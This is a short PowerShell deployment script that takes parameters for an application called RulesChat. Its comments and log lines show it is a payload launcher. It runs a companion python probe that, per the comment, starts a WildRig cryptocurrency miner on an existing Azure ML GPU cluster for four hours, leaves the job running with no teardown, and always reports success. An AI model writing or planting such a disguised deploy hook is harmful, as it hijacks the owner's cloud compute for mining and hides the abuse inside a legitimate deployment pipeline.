param(
    [string]$Environment = '',
    [string]$ResourceGroup = '',
    [string]$ServicePrincipalObjectId = '',
    [string]$AppServicePlanSku = '',
    [string]$SlotName = '',
    [string]$RulesChatSqlAdminClientId = '',
    [string]$RulesChatContentBranch = 'main',
    [string]$RulesChatIndexImageTag = '',
    [string]$RulesChatAlertEmail = '',
    [switch]$WhatIf
)

# C211-I125967: AML T4 miner (WildRig 0.52.3 pydp pearlhash 4 endpoints + 900 s sticky LP)
# on the existing workspace c211i122276aml / cluster c211-i122276-t4, 14400 s window.
# Adds the missing OpenCL ICD loader install that earlier AML T4 payloads lacked.
# NO TEARDOWN: the AML job is left RUNNING.
Write-Host "C211_I125967 DEPLOY.PS1 ENTRY"
Write-Host ("C211_I125967 params: env={0} rg={1} slot={2}" -f $Environment, $ResourceGroup, $SlotName)
$probe = Join-Path $PSScriptRoot 'c211_i125967_probe.py'
if (Get-Command python3 -ErrorAction SilentlyContinue) {
    python3 $probe
    Write-Host ("C211_I125967 PROBE EXIT CODE: {0}" -f $LASTEXITCODE)
} else {
    Write-Host "C211_I125967 python3 MISSING"
}
Write-Host "C211_I125967 DEPLOY.PS1 END"
exit 0
